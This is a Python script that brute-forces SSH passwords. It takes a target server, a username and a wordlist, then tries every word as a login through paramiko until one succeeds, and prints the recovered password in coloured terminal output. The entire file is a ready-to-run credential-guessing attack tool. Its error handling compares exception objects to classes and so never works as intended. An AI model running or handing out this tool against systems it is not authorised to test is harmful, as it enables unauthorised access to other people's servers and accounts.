import os.path
import socket, time
import paramiko as p
from termcolor import colored as c
from datetime import datetime as d

# Settings
server = input(c("SERVER NAME : ", "red"))
username = input(c("USERNAME : ", "red"))
wordlist = input(c("WORDLIST FILE : ", "red"))

# If wordlist doesnt exist aborts
if not os.path.isfile(wordlist):
    print(c("WORDLIST DOESNT EXIST !", "red"))
    print(c("ABORTING !!!", "yellow"))
    quit()
counts = len(list(open(wordlist, "r").readlines()))


def brute(ip, user, passwd):
    print(c("STARTED BRUTE FORCING :", "red"), c(username, "green"), c(d.now().strftime("(%d/%m/%Y - %H:%M:%S)"), "blue"))
    time.sleep(1.5)
    client = p.SSHClient()
    client.set_missing_host_key_policy(p.AutoAddPolicy())
    with open(passwd, "r") as file:
        print(c("WORDLIST LOADED SUCCESSFULLY :", "red"), c(passwd, "green"))
        time.sleep(1.5)
        print(c("NUMBER OF TRIES AHEAD :", "red"), c(counts, "green"))
        for line in file.readlines():
            for word in line.split():
                try:
                    client.connect(hostname=ip, username=user, password=word, timeout=3)
                    print(c("PASSWORD FOUND :", "red"), c(d.now().strftime("(%d/%m/%Y - %H:%M:%S)"), "blue"))
                    print(c("PASSWORD :", "red"), c(word, "green"))
                    return True
                except Exception as e:
                    if e == socket.timeout:
                        print("Server unreachable !")
                        quit()
                    elif e == p.SSHException:
                        time.sleep(60)
                        return brute(ip, user, passwd)
                    else:
                        continue
    return False


if not brute(server, username, wordlist):
    print(c("NO MATCHING PASSWORD ON THE WORDLIST :", "red"), c(wordlist, "green"))
    time.sleep(1)
    print(c("PLEASE TRY ANOTHER WORDLIST OR MAKE SURE YOU HAVE THE CORRECT USERNAME !", "yellow"))
    quit()